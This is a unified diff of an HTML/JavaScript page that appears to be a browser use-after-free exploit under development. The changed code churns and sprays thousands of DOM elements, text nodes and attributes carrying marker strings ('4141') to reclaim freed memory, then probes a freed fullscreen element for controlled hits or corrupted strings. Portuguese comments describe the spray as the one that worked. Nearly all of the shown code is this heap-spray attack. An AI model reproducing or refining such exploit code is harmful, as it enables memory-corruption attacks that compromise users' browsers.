@@ -1,9 +1,8 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>UAF Leak Amplification</title>
+<title>UAF Aggressive Reclaim (Hybrid Precision)</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
@@ -19,20 +18,14 @@ function log(m){
 }
 
 // ==========================
-// HEAP SETUP
-// ==========================
 function setupHeap(){
     let a=[];
     for(let i=0;i<5000;i++){
         let x=new Float64Array(8);
-        x[0]=i;
         a.push(x);
     }
-    return a;
 }
 
-// ==========================
-// FULLSCREEN
 // ==========================
 function setupFS(){
     let fs=document.createElement("div");
@@ -49,74 +42,78 @@ function setupFS(){
 }
 
 // ==========================
-// 💣 RECLAIM (LEAK MODE)
+// 💣 AGGRESSIVE + PRECISION
 // ==========================
 function reclaim(){
 
-    log("[*] Reclaim start");
+    log("[*] reclaim");
 
     let bucket=[];
 
-    // 🔥 LONG STRING SPRAY
+    // 🔥 churn
     for(let i=0;i<8000;i++){
+        let e=document.createElement("div");
+        document.body.appendChild(e);
+        e.remove();
+    }
 
+    // 🔥 HIGH DENSITY SPRAY (igual ao que funcionou)
+    for(let i=0;i<12000;i++){
         let e=document.createElement("div");
 
-        let pattern = "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE";
-
-        e.innerHTML = "HDR_"+i+"_"+pattern.repeat(8);
+        // ⚠️ curto = mais colisão
+        e.innerHTML = "CTRL_"+i+"_4141";
 
         document.body.appendChild(e);
         bucket.push(e);
     }
 
-    // TEXT spray
-    for(let i=0;i<8000;i++){
-        let t=document.createTextNode(
-            "TXT_"+i+"_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
-        );
+    // 🔥 TEXT spray (mistura arenas)
+    for(let i=0;i<12000;i++){
+        let t=document.createTextNode("TXT_"+i+"_BBBB");
         document.body.appendChild(t);
         bucket.push(t);
     }
 
-    log("[*] Reclaim end: "+bucket.length);
+    // 🔥 ATTR spray
+    for(let i=0;i<8000;i++){
+        let e=document.createElement("div");
+        e.setAttribute("x","CCCC_"+i);
+        document.body.appendChild(e);
+        bucket.push(e);
+    }
 
     return bucket;
 }
 
 // ==========================
-// 🔬 LEAK PROBE
+// PROBE
 // ==========================
 function probe(fs){
 
     log("---- PROBE ----");
 
     try{
-        let s = fs.innerHTML;
+        let v = fs.innerHTML;
 
-        log("[LEN] "+(s ? s.length : "null"));
-        log("[VAL] "+s);
+        log("[LEN] "+(v ? v.length : "null"));
+        log("[VAL] "+v);
 
-        if(s){
+        if(v){
 
-            if(s.includes("AAAA")) log("[HIT] A");
-            if(s.includes("BBBB")) log("[HIT] B");
-            if(s.includes("CCCC")) log("[HIT] C");
+            if(v.includes("4141"))
+                log("[!!!] CONTROLLED HIT");
 
-            if(s.length > 20){
-                log("[!!!] POSSIVEL OVERREAD / OVERLAP");
-            }
+            if(v.length <= 2)
+                log("[!!!] STRING CORROMPIDA");
 
         }
 
     }catch(e){
-        log("[CRASH] read");
+        log("[CRASH]");
     }
-
 }
 
-// ==========================
-// TRIGGER
 // ==========================
 function trigger(fs){
 
@@ -131,7 +128,7 @@ function trigger(fs){
     setTimeout(()=>reclaim(),50);
     setTimeout(()=>reclaim(),100);
 
-    setTimeout(()=>probe(fs),120);
+    setTimeout(()=>probe(fs),100);
     setTimeout(()=>probe(fs),200);
     setTimeout(()=>probe(fs),300);
 
@@ -142,8 +139,6 @@ function trigger(fs){
     setTimeout(()=>location.reload(),500);
 }
 
-// ==========================
-// MAIN
 // ==========================
 function runTest(){
 
